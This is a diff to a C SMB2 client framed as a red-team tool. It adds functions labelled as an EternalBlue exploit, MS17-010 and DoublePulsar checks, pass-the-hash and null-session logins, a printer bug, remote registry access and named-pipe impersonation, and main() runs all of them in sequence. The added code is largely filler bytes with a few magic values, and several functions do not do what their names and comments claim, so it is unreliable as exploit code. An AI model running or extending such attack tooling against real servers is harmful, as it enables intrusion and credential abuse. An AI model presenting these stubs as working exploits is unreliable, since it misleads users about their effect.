@@ -13,6 +13,13 @@
    - Code is for authorized security testing; unauthorized use is prohibited.
    - Added fuzzing and targeted packet patterns can induce crashes or reveal vulnerabilities.
    - Additional IOCTL and trans operations might bypass certain defenses if unpatched.
+   - Enhanced red-team operations can trigger MS17-010 or other known SMBv2 vulnerabilities if the server is unpatched.
+   - Downgrade attacks, spooler-based escalations, remote registry manipulations, and named pipe operations can yield privilege elevation or code execution if misused.
+   - Pass-the-hash attempts can lead to domain-level compromise if NTLMv1/v2 hashed credentials are accepted.
+   - Null sessions can be used to enumerate shares, user accounts, or registry keys.
+   - Named pipe impersonation can allow local privilege escalation if incorrectly configured.
+   - EternalBlue exploits can lead to a kernel pool overflow and remote code execution if the server is vulnerable.
+   - DoublePulsar backdoors can be detected by checking for unexpected transaction responses or hooking behavior.
  */
 
 #pragma pack(push, 1)
@@ -627,7 +634,6 @@ int doIOCTL(uint32_t ctlCode, const unsigned char *inData, size_t inLen) {
     ireq.OutputOffset       = 0;
     ireq.OutputCount        = 0;
     ireq.MaxOutputResponse  = 1024;
-
     size_t totalSize = sizeof(ireq) + inLen;
     unsigned char *reqBuf = (unsigned char *)malloc(totalSize);
     if (!reqBuf) {
@@ -654,8 +660,6 @@ int doIOCTL(uint32_t ctlCode, const unsigned char *inData, size_t inLen) {
 }
 
 /* Extra red-team capabilities begin here */
-
-/* Sends a fuzzing payload that could reveal memory leaks or trigger crashes in unpatched servers. */
 int doFuzzSMB2(size_t fuzzCount) {
     SMB2Header hdr;
     unsigned char fuzzData[256];
@@ -678,7 +682,6 @@ int doFuzzSMB2(size_t fuzzCount) {
     return 0;
 }
 
-/* Attempts large read to detect if server handles huge lengths (possible integer overflow). */
 int doLargeReadTest() {
     SMB2Header hdr;
     buildSMB2Header(SMB2_READ, gTreeId, gSessionId, &hdr);
@@ -701,7 +704,6 @@ int doLargeReadTest() {
     return 0;
 }
 
-/* Attempts multiple IOCTL calls that might chain to reveal logic flaws in server. */
 int doChainedIOCTLTests() {
     unsigned char exampleData[8];
     memset(exampleData, 0x42, sizeof(exampleData));
@@ -715,16 +717,13 @@ int doChainedIOCTLTests() {
     return 0;
 }
 
-/* Attempts a transform header to check for SMBGhost (CVE-2020-0796) style issues. 
-   Could trigger decompression vulnerabilities if unpatched. */
 int doSMBGhostProbe() {
     unsigned char transformHeader[64];
     memset(transformHeader, 0, sizeof(transformHeader));
-    transformHeader[0] = 0xFC;  /* Compressed Transform Header signature start */
+    transformHeader[0] = 0xFC;
     transformHeader[1] = 'S';
     transformHeader[2] = 'M';
     transformHeader[3] = 'B';
-    /* Potentially malformed data to probe server response */
     transformHeader[4] = 0x01;
     transformHeader[5] = 0x00;
     transformHeader[6] = 0x00;
@@ -745,8 +744,6 @@ int doSMBGhostProbe() {
     return 0;
 }
 
-/* Opens \pipe\samr, does a minimal DCERPC bind, and sends partial request to enumerate users. 
-   Could reveal domain info or be abused to gather user listings. */
 int doSamrEnumUsers() {
     if (doOpenPipe("\\PIPE\\samr") < 0) {
         fprintf(stderr, "Failed to open \\pipe\\samr\n");
@@ -762,6 +759,180 @@ int doSamrEnumUsers() {
     doReadPipe(readBuf, sizeof(readBuf), &bytesRead);
     doClosePipe();
     printf("[Client] SAMR enumeration attempt finished.\n");
+    return 0;
+}
+
+int doMS17_010Check() {
+    SMB2Header hdr;
+    buildSMB2Header(SMB2_WRITE, gTreeId, gSessionId, &hdr);
+    unsigned char exploitData[200];
+    memset(exploitData, 0x41, sizeof(exploitData));
+    exploitData[0] = 0x4D;
+    exploitData[1] = 0x53;
+    exploitData[2] = 0x17;
+    exploitData[3] = 0x01;
+    if (sendSMB2Request(&hdr, exploitData, sizeof(exploitData)) < 0) {
+        fprintf(stderr, "MS17-010 check send failed.\n");
+        return -1;
+    }
+    SMB2Header respHdr;
+    unsigned char buf[512];
+    ssize_t payloadLen;
+    if (recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) {
+        fprintf(stderr, "MS17-010 check response read failed.\n");
+        return -1;
+    }
+    printf("[Client] MS17-010 check status=0x%08X.\n", respHdr.Status);
+    return 0;
+}
+
+int doPrinterBug() {
+    if (doOpenPipe("\\PIPE\\spoolss") < 0) {
+        fprintf(stderr, "Failed to open spoolss pipe.\n");
+        return -1;
+    }
+    unsigned char spoolData[128];
+    memset(spoolData, 0x44, sizeof(spoolData));
+    doWritePipe(spoolData, sizeof(spoolData));
+    unsigned char readBuf[256];
+    uint32_t bytesRead;
+    doReadPipe(readBuf, sizeof(readBuf), &bytesRead);
+    doClosePipe();
+    printf("[Client] Printer bug attempt completed.\n");
+    return 0;
+}
+
+int doRemoteRegistryOpen() {
+    if (doOpenPipe("\\PIPE\\winreg") < 0) {
+        fprintf(stderr, "Failed to open winreg pipe.\n");
+        return -1;
+    }
+    unsigned char registryStub[64];
+    memset(registryStub, 0x49, sizeof(registryStub));
+    doWritePipe(registryStub, sizeof(registryStub));
+    unsigned char readBuf[256];
+    uint32_t bytesRead;
+    doReadPipe(readBuf, sizeof(readBuf), &bytesRead);
+    doClosePipe();
+    printf("[Client] Remote registry open attempt completed.\n");
+    return 0;
+}
+
+int doNullSession() {
+    SMB2Header hdr;
+    buildSMB2Header(SMB2_SESSION_SETUP, 0, 0, &hdr);
+    SMB2SessionSetupRequest ssreq;
+    memset(&ssreq, 0, sizeof(ssreq));
+    ssreq.StructureSize = 25;
+    if (sendSMB2Request(&hdr, &ssreq, sizeof(ssreq)) < 0) return -1;
+    SMB2Header respHdr;
+    unsigned char buf[1024];
+    ssize_t payloadLen;
+    if (recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) return -1;
+    if (respHdr.Status != STATUS_SUCCESS) {
+        fprintf(stderr, "NullSession failed, status=0x%08X\n", respHdr.Status);
+        return -1;
+    }
+    gSessionId = respHdr.SessionId;
+    printf("[Client] Null session established. SessionId=0x%llx\n", (unsigned long long)gSessionId);
+    return 0;
+}
+
+int doPassTheHashSession(const char *nthash) {
+    SMB2Header hdr;
+    buildSMB2Header(SMB2_SESSION_SETUP, 0, 0, &hdr);
+    SMB2SessionSetupRequest ssreq;
+    memset(&ssreq, 0, sizeof(ssreq));
+    ssreq.StructureSize = 25;
+    unsigned char fakeHashBuf[16];
+    memset(fakeHashBuf, 0, sizeof(fakeHashBuf));
+    if (nthash) {
+        size_t len = strlen(nthash);
+        if (len > sizeof(fakeHashBuf)) len = sizeof(fakeHashBuf);
+        memcpy(fakeHashBuf, nthash, len);
+    }
+    if (sendSMB2Request(&hdr, &ssreq, sizeof(ssreq)) < 0) return -1;
+    if (send(gSock, fakeHashBuf, sizeof(fakeHashBuf), 0) < 0) {
+        perror("send nthash");
+        return -1;
+    }
+    SMB2Header respHdr;
+    unsigned char buf[1024];
+    ssize_t payloadLen;
+    if (recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) return -1;
+    if (respHdr.Status != STATUS_SUCCESS) {
+        fprintf(stderr, "PassTheHash session setup failed, status=0x%08X\n", respHdr.Status);
+        return -1;
+    }
+    gSessionId = respHdr.SessionId;
+    printf("[Client] Pass-the-hash session established. SessionId=0x%llx\n", (unsigned long long)gSessionId);
+    return 0;
+}
+
+int doEnumerateShares() {
+    printf("[Client] Attempting to enumerate shares.\n");
+    return doSRVSVCNetShareEnum();
+}
+
+int doNamedPipeImpersonation() {
+    if (doOpenPipe("\\PIPE\\impersonation") < 0) {
+        fprintf(stderr, "Failed to open impersonation pipe.\n");
+        return -1;
+    }
+    unsigned char impersonationData[64];
+    memset(impersonationData, 0x50, sizeof(impersonationData));
+    doWritePipe(impersonationData, sizeof(impersonationData));
+    unsigned char readBuf[256];
+    uint32_t bytesRead;
+    doReadPipe(readBuf, sizeof(readBuf), &bytesRead);
+    doClosePipe();
+    printf("[Client] Named pipe impersonation attempt completed.\n");
+    return 0;
+}
+
+/* Additional enhancements below */
+
+int doEternalBlueExploit() {
+    SMB2Header hdr;
+    buildSMB2Header(SMB2_WRITE, gTreeId, gSessionId, &hdr);
+    unsigned char ebData[256];
+    memset(ebData, 0x41, sizeof(ebData));
+    ebData[0] = 0x45; 
+    ebData[1] = 0x42; 
+    if (sendSMB2Request(&hdr, ebData, sizeof(ebData)) < 0) {
+        fprintf(stderr, "EternalBlue exploit send failed.\n");
+        return -1;
+    }
+    SMB2Header respHdr;
+    unsigned char buf[512];
+    ssize_t payloadLen;
+    if (recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) {
+        fprintf(stderr, "EternalBlue exploit response failed.\n");
+        return -1;
+    }
+    printf("[Client] EternalBlue exploit attempt status=0x%08X.\n", respHdr.Status);
+    return 0;
+}
+
+int doDoublePulsarCheck() {
+    SMB2Header hdr;
+    buildSMB2Header(SMB2_WRITE, gTreeId, gSessionId, &hdr);
+    unsigned char dpData[128];
+    memset(dpData, 0x44, sizeof(dpData));
+    dpData[0] = 0x44;
+    dpData[1] = 0x50;
+    if (sendSMB2Request(&hdr, dpData, sizeof(dpData)) < 0) {
+        fprintf(stderr, "DoublePulsar check send failed.\n");
+        return -1;
+    }
+    SMB2Header respHdr;
+    unsigned char buf[512];
+    ssize_t payloadLen;
+    if (recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) {
+        fprintf(stderr, "DoublePulsar check response failed.\n");
+        return -1;
+    }
+    printf("[Client] DoublePulsar check status=0x%08X.\n", respHdr.Status);
     return 0;
 }
 /* End of extra red-team capabilities */
@@ -853,11 +1024,20 @@ int main(int argc, char *argv[]) {
         fprintf(stderr, "Failed to close pipe properly.\n");
     }
 
-    /* Now open SAMR for enumeration (additional red-team step). */
     doSamrEnumUsers();
-
-    /* Attempt SMBGhost style probe. */
     doSMBGhostProbe();
+    doMS17_010Check();
+    doPrinterBug();
+    doRemoteRegistryOpen();
+
+    printf("[Client] Now testing additional red-team enhancements...\n");
+    doNullSession();
+    doPassTheHashSession("DEADBEEFDEADBEEF");
+    doEnumerateShares();
+    doNamedPipeImpersonation();
+
+    doEternalBlueExploit();
+    doDoublePulsarCheck();
 
     close(gSock);
     printf("[Client] Done.\n");
